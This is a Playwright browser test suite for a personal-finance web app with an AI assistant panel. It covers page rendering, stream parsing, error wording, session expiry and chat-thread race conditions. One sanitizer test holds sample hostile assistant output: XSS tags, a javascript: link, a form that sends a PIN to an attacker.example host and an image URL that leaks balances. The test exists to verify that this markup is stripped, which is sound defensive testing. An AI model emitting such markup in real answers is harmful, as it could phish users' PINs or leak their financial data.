"""Browser pass over every page, as every persona, in Daylight and Midnight.

    uv sync --all-extras && uv run playwright install chromium
    BANKO_UI_TESTS=1 DATABASE_URL="postgresql://root@localhost:26258/defaultdb?sslmode=disable" \
        uv run pytest tests/ui -q -p no:cacheprovider

Boots the app on port 5073 with AI_SERVICE=ollama. No page may log a console
error; every page is screenshotted to artifacts/ui/."""

import json
import os
import subprocess
import sys
import time
import urllib.parse
import urllib.request
from pathlib import Path

import pytest

pytestmark = pytest.mark.skipif(os.getenv("BANKO_UI_TESTS") != "1", reason="set BANKO_UI_TESTS=1 to run the browser pass")
playwright = pytest.importorskip("playwright.sync_api")
expect = playwright.expect

PORT = 5073
BASE = f"http://127.0.0.1:{PORT}"
OUT = Path(__file__).resolve().parents[2] / "artifacts" / "ui"
PAGES = ["/", "/accounts", "/transactions", "/cashflow", "/budget", "/recurring", "/goals", "/assistant",
         "/coach", "/agents", "/settings"]
PERSONAS = ["maya", "sam", "riley"]

# The assistant panel tests mock the assistant API with page.route, so no
# model runs and the test decides when each answer arrives.
OLD_THREAD = "22222222-2222-4222-8222-222222222222"
NEW_THREAD = "33333333-3333-4333-8333-333333333333"
LEGACY_THREAD = "44444444-4444-4444-8444-444444444444"
OTHER_USERS_THREAD = "55555555-5555-4555-8555-555555555555"
HISTORY = {"thread_id": OLD_THREAD, "title": "Yesterday's chat", "active_receipt": None,
           "messages": [{"role": "user", "content": "What did I spend on coffee?"},
                        {"role": "assistant", "content": "You spent $12.40 on coffee."}]}


def _sse(*events) -> str:
    return "".join(f"event: {name}\ndata: {json.dumps(data)}\n\n" for name, data in events)


ANSWER = _sse(("step", {"label": "Intent routing", "ms": 3, "status": "success"}),
              ("token", {"text": "You spent $42.10 on dining."}),
              ("answer", {"answer": "You spent $42.10 on dining.", "citations": [], "proposals": [], "cached": False,
                          "route": "aggregate", "meta": {"trace": []}}),
              ("done", {}))
RECEIPT = _sse(("step", {"step": "ocr", "status": "done", "detail": "120 characters", "ms": 400}),
               ("receipt", {"document_id": "66666666-6666-4666-8666-666666666666", "status": "posted",
                            "merchant": "Blue Bottle", "amount": 9.75, "category": "Coffee", "thread_id": OLD_THREAD}),
               ("done", {}))
PIXEL = bytes.fromhex("47494638396101000100800000000000ffffff21f90401000000002c00000000010001000002024401003b")


@pytest.fixture(scope="module")
def server():
    env = {**os.environ, "AI_SERVICE": "ollama", "COACH_KAFKA_ENABLED": "false",
           "CDC_WEBHOOK_HMAC_SECRET": "dev-only-secret", "PYTHONUNBUFFERED": "1"}
    assert ":26258/" in env.get("DATABASE_URL", ""), "the browser pass runs against the test database only"
    # `python -m banko_ai` ignores its arguments, so call the click group directly.
    proc = subprocess.Popen([sys.executable, "-c", "from banko_ai.cli import cli; cli()",
                             "run", "--host", "127.0.0.1", "--port", str(PORT)],
                            env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    deadline = time.time() + 300
    while time.time() < deadline:
        try:
            if urllib.request.urlopen(BASE + "/api/health/ready", timeout=2).status == 200:
                break
        except Exception:
            time.sleep(2)
    else:
        proc.kill()
        pytest.fail("the app never became ready on port 5073")
    yield BASE
    proc.terminate()
    proc.wait(timeout=20)


@pytest.fixture(scope="module")
def browser():
    with playwright.sync_playwright() as p:
        b = p.chromium.launch()
        yield b
        b.close()


def _page(browser, theme):
    ctx = browser.new_context(color_scheme=theme, viewport={"width": 1360, "height": 900})
    page = ctx.new_page()
    errors = []
    page.on("console", lambda m: errors.append(m.text) if m.type == "error" else None)
    page.on("pageerror", lambda e: errors.append(str(e)))
    return ctx, page, errors


def _login(page, base, persona):
    page.goto(base + "/login")
    page.locator(f'form:has(input[name="username"][value="{persona}"]) button').click()
    page.wait_for_url(base + "/")


@pytest.mark.parametrize("theme", ["light", "dark"])
@pytest.mark.parametrize("persona", PERSONAS)
def test_every_page_renders_without_console_errors(server, browser, persona, theme):
    OUT.mkdir(parents=True, exist_ok=True)
    ctx, page, errors = _page(browser, theme)
    try:
        _login(page, server, persona)
        for path in PAGES:
            page.goto(server + path)
            page.wait_for_load_state("networkidle")
            assert page.locator("[data-page]").count() == 1, path
            page.screenshot(path=str(OUT / f"{persona}-{theme}-{path.strip('/') or 'dashboard'}.png"), full_page=True)
        assert not errors, errors
    finally:
        ctx.close()


def test_stream_parser_handles_error_and_abort(server, browser):
    ctx, page, errors = _page(browser, "light")
    try:
        _login(page, server, "maya")
        parsed = page.evaluate("""() => {
            const a = Banko.parseSSE('event: token\\ndata: {"text": "Hi"}\\n\\nevent: error\\ndata: {"message": "x"}\\n\\nevent: tok');
            return { kinds: a.events.map(e => e.event), rest: a.rest };
        }""")
        assert parsed == {"kinds": ["token", "error"], "rest": "event: tok"}

        page.route("**/api/v1/assistant/threads/failing/messages", lambda route: route.fulfill(
            status=500, content_type="application/json",
            body='{"error": "Something went wrong on our side. Please try again."}'))
        failed = page.evaluate("""async () => {
            try { await Banko.stream("/api/v1/assistant/threads/failing/messages", { body: { message: "hi" }, onEvent: () => {} }); return "finished"; }
            catch (e) { return e.message; }
        }""")
        assert failed == "Something went wrong on our side. Please try again."

        page.route("**/api/v1/assistant/threads/hanging/messages", lambda route: None)  # never answers
        stopped = page.evaluate("""async () => {
            const c = new AbortController();
            setTimeout(() => c.abort(), 300);
            try { await Banko.stream("/api/v1/assistant/threads/hanging/messages", { body: { message: "hi" }, signal: c.signal, onEvent: () => {} }); return "finished"; }
            catch (e) { return e.name; }
        }""")
        assert stopped == "AbortError"
    finally:
        ctx.close()


def test_errors_people_see_are_plain_words(server, browser):
    ctx, page, errors = _page(browser, "light")
    try:
        _login(page, server, "maya")
        page.route("**/api/v1/transactions?q=*", lambda route: route.fulfill(
            status=503, json={"error": "warming_up", "detail": "waiting for the database (OperationalError)"}))
        seen = page.evaluate("""async () => {
            const out = {};
            try { null.accounts; } catch (e) { out.script = Banko.explain(e); }
            try { await Banko.api("http://127.0.0.1:9/api/v1/me"); } catch (e) { out.offline = Banko.explain(e); }
            try { await Banko.api("/api/v1/transactions?q=coffee"); } catch (e) { out.warming = Banko.explain(e); }
            out.message = Banko.explain(new Banko.ApiError(400, "Pick a category"));
            out.code = Banko.explain(new Banko.ApiError(503, "warming_up"));
            out.unknown = Banko.explain(new Banko.ApiError(500, "some_new_code"));
            out.nothing = Banko.explain(undefined);
            out.fallback = Banko.FALLBACK;
            return out;
        }""")
        fallback = seen.pop("fallback")
        assert seen["script"] == seen["offline"] == seen["unknown"] == seen["nothing"] == fallback
        assert seen["message"] == "Pick a category"
        assert seen["warming"] == seen["code"]
        assert "warming up" in seen["code"].lower()
        for text in seen.values():
            assert "warming_up" not in text and "OperationalError" not in text and "fetch" not in text.lower()
    finally:
        ctx.close()


def test_assistant_markup_is_sanitized(server, browser):
    ctx, page, errors = _page(browser, "light")
    try:
        _login(page, server, "maya")
        html = page.evaluate("""() => DOMPurify.sanitize(marked.parse('<img src=x onerror=alert(1)><script>alert(2)</script>**ok**'))""")
        assert "onerror" not in html and "<script" not in html and "<strong>ok</strong>" in html
        plain = page.evaluate("""() => Banko.stripCitations('Lunch [txn:abc] and [ txn : 1234 ] done')""")
        assert plain == "Lunch and done"
        # What the assistant really renders: one answer must not be able to
        # blank the app, collect a PIN, or fetch an outside image.
        hostile = ("**ok** <style>body{display:none}</style>\n\n"
                   "<form action='https://attacker.example/steal'><input name=pin><button>Verify</button></form>\n\n"
                   "![chart](https://attacker.example/p.png?q=balances) <img src=x onerror=alert(1)><script>alert(2)</script>\n\n"
                   "[click](javascript:alert(1)) and [the docs](https://www.cockroachlabs.com/docs/)\n\n"
                   "| Category | Total |\n|:--|--:|\n| Dining | $42 |\n\n- one\n- two [txn:abc]")
        rendered = page.evaluate("(s) => Banko.renderAnswer(s)", hostile)
        for banned in ("<style", "display:none", "<form", "<input", "<button", "<img", "attacker.example",
                       "javascript:", "onerror", "<script", "[txn:"):
            assert banned not in rendered, banned
        assert "<strong>ok</strong>" in rendered and "<table>" in rendered and "<li>one</li>" in rendered
        assert 'href="https://www.cockroachlabs.com/docs/"' in rendered and 'rel="noopener noreferrer"' in rendered
    finally:
        ctx.close()


def test_expired_session_goes_to_login(server, browser):
    # Not maya: a request without a session acts as maya, the default persona.
    ctx, page, errors = _page(browser, "light")
    try:
        _login(page, server, "sam")
        page.goto(server + "/transactions")
        page.wait_for_load_state("networkidle")
        ctx.clear_cookies()
        page.locator("button.b-f").first.click()
        page.wait_for_url(server + "/login", timeout=10000)
    finally:
        ctx.close()


class _PanelApi:
    """The assistant API the panel talks to, mocked. The history of the
    remembered thread is held until release(), so a test can let the user
    act first, which is what a slow checkpoint read looks like."""

    def __init__(self, page):
        self.held, self.fetched = [], []
        page.route("**/api/v1/assistant/**", self._assistant)
        page.route("**/api/v1/receipts", lambda r: r.fulfill(status=200, content_type="text/event-stream", body=RECEIPT))
        page.route("**/api/v1/receipts/*/thumbnail", lambda r: r.fulfill(status=200, content_type="image/gif", body=PIXEL))
        page.route("**/api/v1/transactions?q=*", lambda r: r.fulfill(json={"items": []}))

    def _assistant(self, route):
        req = route.request
        path = urllib.parse.urlparse(req.url).path
        if req.method == "GET" and path.startswith("/api/v1/assistant/threads/"):
            self.fetched.append(path.rsplit("/", 1)[-1])
            if path.endswith(OLD_THREAD):
                self.held.append(route)
                return None
            return route.fulfill(status=404, json={"error": "not_found"})
        if req.method == "POST" and path.endswith("/messages"):
            return route.fulfill(status=200, content_type="text/event-stream", body=ANSWER)
        if req.method == "POST" and path == "/api/v1/assistant/threads":
            return route.fulfill(status=201, json={"thread_id": NEW_THREAD, "title": "New chat"})
        return route.fallback()

    def release(self):
        while self.held:
            self.held.pop(0).fulfill(status=200, json=HISTORY)


def _remember_a_thread(page, base, persona) -> str:
    """Sign in, then reload with yesterday's thread remembered for this
    user, plus the entries the panel must never load: the old unkeyed one
    and another persona's."""
    _login(page, base, persona)
    uid = page.evaluate("() => Banko.shell.user.user_id")
    page.evaluate("""([uid, mine, legacy, other]) => {
        localStorage.setItem('banko.thread:' + uid, mine);
        localStorage.setItem('banko.thread', legacy);
        localStorage.setItem('banko.thread:00000000-0000-4000-8000-0000000000ff', other);
    }""", [uid, OLD_THREAD, LEGACY_THREAD, OTHER_USERS_THREAD])
    page.reload()
    page.wait_for_load_state("networkidle")
    return uid


def test_a_question_from_the_palette_survives_the_history_load(server, browser):
    ctx, page, errors = _page(browser, "light")
    try:
        api = _PanelApi(page)
        _remember_a_thread(page, server, "sam")
        page.keyboard.press("Control+k")
        page.locator(".b-palette input").fill("how much did I spend on dining?")
        page.keyboard.press("Enter")
        page.wait_for_timeout(500)  # the question is asked before yesterday's history comes back
        api.release()
        chat = page.locator(".b-panel .b-chat")
        expect(chat).to_contain_text("how much did I spend on dining?")
        expect(chat).to_contain_text("You spent $42.10 on dining.")
        expect(chat).to_contain_text("What did I spend on coffee?")
        page.wait_for_timeout(500)
        expect(chat).to_contain_text("You spent $42.10 on dining.")
        assert api.fetched == [OLD_THREAD]
        assert not errors, errors
    finally:
        ctx.close()


def test_a_dropped_receipt_keeps_its_card_when_the_history_loads(server, browser):
    ctx, page, errors = _page(browser, "light")
    try:
        api = _PanelApi(page)
        _remember_a_thread(page, server, "sam")
        page.evaluate("""() => {
            const dt = new DataTransfer();
            dt.items.add(new File(['receipt'], 'lunch.jpg', { type: 'image/jpeg' }));
            window.dispatchEvent(new DragEvent('drop', { dataTransfer: dt, bubbles: true, cancelable: true }));
        }""")
        page.wait_for_timeout(500)
        api.release()
        card = page.locator(".b-panel .b-receipt")
        expect(card).to_contain_text("Blue Bottle")
        expect(page.locator(".b-panel .b-chat")).to_contain_text("What did I spend on coffee?")
        page.wait_for_timeout(500)
        expect(card).to_contain_text("Posted · Coffee")
        assert not errors, errors
    finally:
        ctx.close()


def test_asking_about_a_nudge_opens_a_new_thread_even_when_the_history_answers_late(server, browser):
    ctx, page, errors = _page(browser, "light")
    try:
        api = _PanelApi(page)
        uid = _remember_a_thread(page, server, "sam")
        page.evaluate("() => Banko.emit('banko:ask', { context: { kind: 'nudge', id: '77777777-7777-4777-8777-777777777777' } })")
        page.wait_for_timeout(500)
        api.release()
        expect(page.locator(".b-panel .b-panel-h")).to_contain_text("New chat")
        page.wait_for_timeout(500)
        expect(page.locator(".b-panel .b-panel-h")).to_contain_text("New chat")
        expect(page.locator(".b-panel .b-chat")).not_to_contain_text("What did I spend on coffee?")
        assert page.evaluate("(uid) => localStorage.getItem('banko.thread:' + uid)", uid) == NEW_THREAD
        assert not errors, errors
    finally:
        ctx.close()


def test_a_fresh_signup_shows_progress_not_zeros(server, browser):
    ctx, page, errors = _page(browser, "light")
    try:
        page.goto(server + "/login")
        page.fill('#name-form input[name="username"]', f"ui-{int(time.time())}")
        page.locator("#name-form button[type=submit]").click()
        page.wait_for_selector("#signup-section", state="visible")
        page.locator("#name-form button[type=submit]").click()
        page.wait_for_url(server + "/")
        page.wait_for_selector("text=Setting up your accounts", state="visible", timeout=15000)
        assert page.locator('section[x-data="dashboardPage"] > .b-grid').first.is_hidden()
        assert not errors, errors
    finally:
        ctx.close()
